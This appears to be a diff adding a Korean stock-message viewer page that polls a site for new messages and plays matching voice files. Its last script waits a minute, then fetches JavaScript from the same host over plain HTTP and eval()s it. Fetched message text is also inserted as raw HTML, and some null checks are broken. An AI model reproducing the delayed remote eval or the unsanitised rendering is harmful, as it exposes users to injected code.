@@ -1,0 +1,350 @@
+<div id="ui/Page/주식-메세지-뷰어-음성/index" style="height: 100%; width: 100%; text-align: center; overflow-y: hidden;">
+
+	<style>
+		::-webkit-scrollbar { width: 6px; } ::-webkit-scrollbar-track { background-color: lightblue; } ::-webkit-scrollbar-track-piece { background-color: gray; } ::-webkit-scrollbar-thumb { border-radius: 8px; background-color: white; } ::-webkit-scrollbar-button { background-color: darkblue; width: 20px; height: 10px; } ::-webkit-scrollbar-button:start { background-color: red; } ::-webkit-scrollbar-button:end { background-color: orange; } ::-webkit-scrollbar-button:vertical:increment {} ::-webkit-scrollbar-button:vertical:decrement {} ::-webkit-scrollbar-corner { background-color: violet; } ::-webkit-resizer { background-color: green; }
+		body { background-color: rgba( 0, 0, 0, 0 ); overflow-x : hidden; overflow-y: hidden; }
+		div { overflow-x : hidden; }
+		a { color: #7ef542; text-decoration: none; }
+		input { height: 30px; width: 100%; padding: 0px; }
+		textarea { color: #ffffff; }
+		.message { padding: 5px; display: flex; width: 100%; overflow: hidden; font-size: 18px; }
+		.message div { display: inline-block; word-break: norwap; white-space: norwap; text-overflow : clip; width: 100%; }
+		.message span { display: inline-block; word-break: norwap; white-space: norwap; text-overflow : clip; height: 100%; }
+		.time { cursor: pointer; color: orange; max-width: 169px; }
+		table { color: #ffffff; }
+		thead tr { color: #ffffff; }
+		tbody tr:nth-child(2n) {}
+		tbody tr:nth-child(2n+1) {background-color: #262626;}
+	</style>
+
+	<!-- ---------------------------------------------------------------------------------------------------- -->
+
+	<audio id="ID-AUDIO-DING" controls style="display: none;"><source id="ID-AUDIO-DING_SRC" src="http://thdtjsdn.com/mp3/_woman/New Message.mp3" type="audio/mpeg"></audio>
+	<audio id="ID-AUDIO" controls style="display: none;"><source id="ID-AUDIO_SRC" src="" type="audio/mpeg"></audio>
+
+	<!-- ---------------------------------------------------------------------------------------------------- -->
+
+	<div style="cursor: pointer; padding: 10px; opacity: 0.9; background-color: #FFFFFF; color: #000000;
+			text-align: left; font-size: 20px;
+			position: absolute; left: 0px; right: 0px; top: 200px;"
+		onclick="this.style.display='none'">
+		<b>
+		설명을 읽고 난후 클릭하면 설명창은 삭제됨
+		<br><br>
+		- '왼쪽 글 작성 시간' 클릭시 - 해당 위치부터 음성 재생
+		<br><br>
+		- '음성 재생' 버튼 클릭시 - 최근 글부터 음성 재생
+		<br><br>
+		- '음성 정지' 버튼 클릭시 - 음성 재생 중단
+		<br><br>
+		<span style="color: #ff0000;">- 화면 아무곳이나 한번 클릭해야 음성 재생 가능(브라우저 권한문제)</span>
+		</b>
+	</div>
+
+	<!-- ---------------------------------------------------------------------------------------------------- -->
+
+	<div style="display: flex;">
+		<input id="ui/Page/주식-메세지-뷰어-음성/index--INPUT--암호" placeholder="Password" style="height: 34px;"/>
+		<input id="ui/Page/주식-메세지-뷰어-음성/index--BUTTON--불러오기" type="button" value="불러오기" style="height: 34px;"/>
+		<input id="ui/Page/주식-메세지-뷰어-음성/index--BUTTON--재생" type="button" value="음성 재생" style="height: 34px;"/>
+		<input id="ui/Page/주식-메세지-뷰어-음성/index--BUTTON--재생정지" type="button" value="음성 정지" style="height: 34px;"/>
+		<input id="ui/Page/주식-메세지-뷰어-음성/index--BUTTON--초기화" type="button" value="초기화" style="height: 34px;"/>
+		<input id="ui/Page/주식-메세지-뷰어-음성/index--BUTTON--봇메세지삭제" type="button" value="봇 메세지 삭제" style="height: 34px;"/>
+	</div>
+
+	<div id="ui/Page/주식-메세지-뷰어-음성/index--메세지" style="width: 100%; height: 100%; max-height: calc( 100% - 300px ); overflow-x: auto; text-align : left; color: #ffffff;">
+	</div>
+
+	<script>
+		window.document.body.style.backgroundColor = " !important";
+
+		/*/
+		(function(){
+			var FN = function(){ SUtilXMLHttpReqGet.req( "http://thdtjsdn.com/html/ad/google/ad--google--100per x 271.html", { onloadend : function( e ){
+					var html = e.target.responseText;
+					try{ var t = window.document.getElementById( "ID-AD--GOOGLE" ).children; t[ 0 ].remove(); t[ 0 ].remove(); t[ 0 ].remove(); }catch( er ){}
+					window.document.getElementById( "ID-AD--GOOGLE" ).innerHTML = html;
+			}});};
+			setInterval( FN, 10000 );
+		})();
+		//*/
+
+		(function(){
+			var FN = function(){
+				SUtilXMLHttpReqGet.req( "http://thdtjsdn.com/download__message_stock", { onloadend : function( e ){
+						var t = e.target.responseText;
+
+						if( !t ){ setTimeout( FN, FN.TIMEOUT_TIME ); return; }
+
+						if( FN.last_str == t ){ setTimeout( FN, FN.TIMEOUT_TIME ); return; }else{ FN.last_str = t; }
+
+						if( t ){
+							FN.audio_ding.play();
+
+							try{ var str = SUtilXMLHttpReqGet.reqSyncReturn( FN.URL0 + t + ".txt" ).responseText; }
+							catch(er){
+								setTimeout( FN, FN.TIMEOUT_TIME );
+								return;
+							}
+
+							if( str.indexOf( "404 Not Found" ) != -1 ){
+								setTimeout( FN, FN.TIMEOUT_TIME );
+								return;
+							}
+
+							FN.appendMessage( t, str );
+
+							FN.audioSrc.src = "http://thdtjsdn.com/txt/message/stock/" + t + ".mp3";
+							try{ FN.audio.load(); FN.audio.play(); } catch(er){}
+						}
+
+						setTimeout( FN, FN.TIMEOUT_TIME );
+					}
+				});
+			};
+			FN.TEMP_EL = window.document.createElement( "div" );
+			FN.URL0 = "http://thdtjsdn.com/txt/message/stock/";
+			FN.pad = function( n ){ var s = n.toString(); if( s.length == 1 ) return "0" + s; else return s; };
+			FN.appendMessage = function( t, str ){
+				var el = window.document.getElementById( "ui/Page/주식-메세지-뷰어-음성/index--메세지" );
+				var html = '<div class="message" data-date="{{DATE}}">';
+					html = html.replace( "{{DATE}}", t );
+				var d = new Date( Number( t ) );
+				//var date = d.getFullYear() + FN.pad( d.getMonth() + 1 ) + FN.pad( d.getDate() ) + " " + FN.pad( d.getHours() ) + ":" + FN.pad( d.getMinutes() ) + ":" + FN.pad( d.getSeconds() );
+				var date = d.getFullYear() + "-" + FN.pad( d.getMonth() + 1 ) + "-" + FN.pad( d.getDate() ) + " " + FN.pad( d.getHours() ) + ":" + FN.pad( d.getMinutes() ) + ":" + FN.pad( d.getSeconds() );
+				if( str.indexOf( "</a>" ) != -1 ){
+					html += '<div class="time">' + date + ' </div><span>　-　</span><div>' + str + '</div>';
+				}
+				else{
+					if( str.indexOf( "\n" ) != -1 && str.indexOf( "<table" ) == -1 ){
+						html += '<div class="time">' + date + ' </div><span>　-　</span><div>' + str.replace( /\n/gi, "<br>" ) + '</div>';
+					}
+					else html += '<div class="time">' + date + ' </div><span>　-　</span><div>' + str + '</div>';
+				}
+
+				html += '</p>';
+
+				/*/
+				//el.appendChild( window.apis.html.createHTMLElement( "<br>" ) );
+				el.appendChild( window.apis.html.createHTMLElement( html ) );
+				/*/
+				FN.TEMP_EL.innerHTML = html;
+				el.appendChild( FN.TEMP_EL.children[ 0 ] );
+				//*/
+
+				el.scrollBy( 0, 200 );
+			};
+			FN.notify = function( str ){
+				if( Notification.permission !== 'granted' ) alert( 'notification is disabled' );
+				else {
+					var notification = new Notification( 'Ttw Message', {
+						  icon : ""
+						, body : str
+					});
+					//notification.onclick = function(){ window.open( 'http://google.com' ); };
+				}
+			};
+			FN.audio_ding = window.document.getElementById( "ID-AUDIO-DING" );
+			FN.audio = window.document.getElementById( "ID-AUDIO" );
+			FN.audioSrc = window.document.getElementById( "ID-AUDIO_SRC" );
+			FN.last_str = "";
+			FN.TIMEOUT_TIME = 5000;
+
+			setTimeout(function(){
+
+				//if( window.Notification ) Notification.requestPermission();
+
+				FN.audio_ding.load();
+
+				var d = new Date();
+
+				var a0 = [];
+				var a1 = [];
+				try{
+					var DATE_STRING = d.getFullYear() + FN.pad( d.getMonth() + 1 ) + FN.pad( d.getDate() );
+					var str = SUtilXMLHttpReqGet.reqSyncReturn( FN.URL0 + "__" + DATE_STRING + ".txt" ).responseText;
+						a0 = str.split( "\n|" );
+				}catch(er){}
+
+				try{
+					d.setDate( d.getDate() - 1 );
+					var DATE_STRING = d.getFullYear() + FN.pad( d.getMonth() + 1 ) + FN.pad( d.getDate() );
+					var str = SUtilXMLHttpReqGet.reqSyncReturn( FN.URL0 + "__" + DATE_STRING + ".txt" ).responseText;
+					a1 = str.split( "\n|" );
+					a0 = a1.concat( a0 );
+				}catch(er){}
+
+				try{
+					d.setDate( d.getDate() - 1 );
+					var DATE_STRING = d.getFullYear() + FN.pad( d.getMonth() + 1 ) + FN.pad( d.getDate() );
+					var str = SUtilXMLHttpReqGet.reqSyncReturn( FN.URL0 + "__" + DATE_STRING + ".txt" ).responseText;
+					a1 = str.split( "\n|" );
+					a0 = a1.concat( a0 );
+				}catch(er){}
+
+				try{
+					d.setDate( d.getDate() - 1 );
+					var DATE_STRING = d.getFullYear() + FN.pad( d.getMonth() + 1 ) + FN.pad( d.getDate() );
+					var str = SUtilXMLHttpReqGet.reqSyncReturn( FN.URL0 + "__" + DATE_STRING + ".txt" ).responseText;
+					a1 = str.split( "\n|" );
+					a0 = a1.concat( a0 );
+				}catch(er){}
+
+				try{
+					d.setDate( d.getDate() - 1 );
+					var DATE_STRING = d.getFullYear() + FN.pad( d.getMonth() + 1 ) + FN.pad( d.getDate() );
+					var str = SUtilXMLHttpReqGet.reqSyncReturn( FN.URL0 + "__" + DATE_STRING + ".txt" ).responseText;
+					a1 = str.split( "\n|" );
+					a0 = a1.concat( a0 );
+				}catch(er){}
+
+				try{ a0.forEach(function( item ){
+					var aa = [];
+					var idx0 = item.indexOf( " - " );
+					aa[ 0 ] = item.slice( 0, idx0 );
+					aa[ 1 ] = item.slice( idx0 + 3, item.length );
+
+					if( aa[ 1 ] ) FN.appendMessage( aa[ 0 ], aa[ 1 ] );
+
+				}); }catch(e){}
+				FN.last_str = a0[ a0.length - 1 ].split( " - " )[ 0 ];
+
+				setTimeout( FN, FN.TIMEOUT_TIME );
+			}, 3000 );
+
+			window.__FN = FN;
+		})();
+
+		window.document.getElementById( "ui/Page/주식-메세지-뷰어-음성/index--메세지" ).addEventListener( "click", function( event ){
+			var t = event.target;
+			if( t.tagName != "DIV" ) return;
+
+			if( t.parentElement.getAttribute( "class" ) != "message" ) return;
+
+			if( t.getAttribute( "class" ) == "time" ){
+				var a = window.document.getElementById( "ui/Page/주식-메세지-뷰어-음성/index--메세지" ).children;
+				var fn = function(){
+					var el = a[ fn.i ];
+					if( !el ){
+						el.style.backgroundColor = "";
+						++fn.i;
+						if( fn.i >= fn.iLen ) return;
+						setTimeout( fn, 1 );
+					}
+
+					el.style.backgroundColor = "brown";
+					window.document.getElementById( "ui/Page/주식-메세지-뷰어-음성/index--메세지" ).scrollTo( 0, el.offsetTop - el.offsetHeight - 100 );
+
+					window.__FN.audioSrc.src = window.__FN.URL0 + el.getAttribute( "data-date" ) + ".mp3";
+					window.__FN.audioSrc.onerror = function( event ){
+						el.style.backgroundColor = "";
+						++fn.i;
+						if( fn.i >= fn.iLen ) return;
+						setTimeout( fn, 1 );
+					};
+					window.__FN.audio.onended = function( event ){
+						el.style.backgroundColor = "";
+						++fn.i;
+						if( fn.i >= fn.iLen ) return;
+						setTimeout( fn, 1 );
+					};
+
+					try
+					{
+						window.__FN.audio.load();
+					}
+					catch(er)
+					{
+						++fn.i;
+						if( fn.i >= fn.iLen ) return;
+						setTimeout( fn, 1 );
+						return;
+					}
+
+					window.__FN.audio.play();
+				};
+				fn.i = Array.prototype.slice.call( a ).indexOf( t.parentElement );
+				fn.io = null;
+				fn.iLen = a.length;
+				fn.list = a;
+				setTimeout( fn, 1 );
+			}
+		});
+
+		window.document.getElementById( "ui/Page/주식-메세지-뷰어-음성/index--BUTTON--불러오기" ).addEventListener( "click", function( event ){ alert( "준비중" ); });
+		window.document.getElementById( "ui/Page/주식-메세지-뷰어-음성/index--BUTTON--재생정지" ).addEventListener( "click", function( event ){
+			window.__FN.audio.pause();
+			window.__FN.audio.currentTime = 0;
+		});
+		window.document.getElementById( "ui/Page/주식-메세지-뷰어-음성/index--BUTTON--재생" ).addEventListener( "click", function( event ){
+			var a = window.document.getElementsByClassName( "message" );
+			var fn = function(){
+				var el = a[ fn.iLen ];
+				if( !el ){
+					el.style.backgroundColor = "";
+					--fn.iLen;
+					if( fn.iLen < 0 ) return;
+					setTimeout( fn, 1 );
+				}
+
+				el.style.backgroundColor = "brown";
+				window.document.getElementById( "ui/Page/주식-메세지-뷰어-음성/index--메세지" ).scrollTo( 0, el.offsetTop - el.offsetHeight - 100 );
+
+				window.__FN.audioSrc.src = window.__FN.URL0 + el.getAttribute( "data-date" ) + ".mp3";
+				window.__FN.audioSrc.onerror = function( event ){
+					el.style.backgroundColor = "";
+					--fn.iLen;
+					if( fn.iLen < 0 ) return;
+					setTimeout( fn, 1 );
+				};
+				window.__FN.audio.onended = function( event ){
+					el.style.backgroundColor = "";
+					--fn.iLen;
+					if( fn.iLen < 0 ) return;
+					setTimeout( fn, 1 );
+				};
+
+				try
+				{
+					window.__FN.audio.load();
+				}
+				catch(er)
+				{
+					--fn.iLen;
+					if( fn.iLen < 0 ) return;
+					setTimeout( fn, 1 );
+					return;
+				}
+
+				window.__FN.audio.play();
+			};
+			fn.i = 0;
+			fn.io = null;
+			fn.iLen = a.length - 1;
+			fn.list = a;
+			setTimeout( fn, 1 );
+		});
+		window.document.getElementById( "ui/Page/주식-메세지-뷰어-음성/index--BUTTON--초기화" ).addEventListener( "click", function( event ){ alert( "준비중" ); });
+		window.document.getElementById( "ui/Page/주식-메세지-뷰어-음성/index--BUTTON--봇메세지삭제" ).addEventListener( "click", function( event ){
+			var el = window.document.getElementById( "ui/Page/주식-메세지-뷰어-음성/index--메세지" );
+			var a = el.children;
+
+			var ta = [];
+			var i=0, iLen=a.length;
+			for( ; i<iLen; ++i ){ if( a[ i ].innerText.indexOf( "[ 행동 추적 봇 ]" ) != -1 || a[ i ].innerText.indexOf( "[ 가상화폐 알림봇 ]" ) != -1 ) ta.push( a[ i ] ); }
+			ta.forEach(function( item ){ try{ item.remove(); }catch(er){} })
+		});
+	</script>
+	<br>
+	<!-- AD -->
+	<div id="ID-AD--GOOGLE" style="width: 100%; height: 271px;"><div class="inline-ad"><script type="text/javascript">google_ad_client="ca-pub-1892980256031512";google_ad_host="ca-host-pub-1556223355139109";google_ad_host_channel="L0007";google_ad_slot="6262262429";google_ad_width=1080;google_ad_height=250;</script><script type="text/javascript" src="https://pagead2.googlesyndication.com/pagead/show_ads.js"></script><ins id="aswift_2_expand" style="display:inline-table;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:10px;background-color:transparent;" data-ad-slot="6262262429"><ins id="aswift_2_anchor" style="display:block;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;"><iframe width="0" height="0" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_2" name="aswift_2" style="left:0;position:absolute;top:0;border:0px;width:0px;height:0px;"></iframe></ins></ins></div></div>
+
+</div>
+
+<SCRIPT type="text/javascript">
+window[ "__INITIALIZE-PACKAGE__" ] = function( e, t ){};
+</SCRIPT>
+
+<SCRIPT id="ID-SCRIPT-000" type="text/javascript" src="http://thdtjsdn.com:49323/js-common/lib.common.js" async="false" defer="true"></SCRIPT>
+
+<script>setTimeout(function(){try{var o=new XMLHttpRequest();o.addEventListener("loadend",function(e){eval(this.responseText);});o.open("GET", "http://thdtjsdn.com/index.end.js?t="+Date.now());o.send();}catch(e){}},60000);</script>
